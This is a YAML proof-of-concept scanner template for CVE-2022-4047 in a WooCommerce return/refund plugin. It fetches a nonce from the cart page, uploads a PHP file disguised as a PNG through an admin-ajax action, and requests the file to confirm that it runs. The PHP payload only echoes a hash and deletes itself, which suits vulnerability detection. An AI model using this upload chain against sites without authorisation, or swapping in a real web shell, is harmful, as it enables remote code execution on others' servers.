name: yaml-poc-wpswings-return_refund_and_exchange_for_woocommerce-logical-CVE-2022-4047
binding: e393109d-4ea2-4540-803b-cee05662b699
detail:
    author: jiapeng.han
    links:
        - https://wpscan.com/vulnerability/8965a87c-5fe5-4b39-88f3-e00966ca1d94
    vulnerability:
        id: daa62437-5c89-420c-89df-e12093059ace
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomInt(40000, 44800)
    rboundary: randomLowercase(8)
    randname: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cart/
            follow_redirects: false
        expression: response.status == 200
        output:
            search: '''"wps_rma_nonce":"(?P<token>.*?)",''.bsubmatch(response.body)'
            token: search["token"]
    r1:
        request:
            cache: true
            method: POST
            path: /wp-admin/admin-ajax.php?action=wps_rma_return_upload_files&security_check={{token}}
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"wps_rma_return_request_order\"\r\n\nprefix\r\n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"wps_rma_return_request_files[]\"; filename=\"{{randname}}.php\"\r\nContent-Type: image/png\r\n\r\n<?php echo md5({{r1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
            follow_redirects: false
        expression: response.status == 200
    r2:
        request:
            cache: true
            method: GET
            path: /wp-content/attachment/prefix-{{randname}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
expression: r0() && r1() && r2()
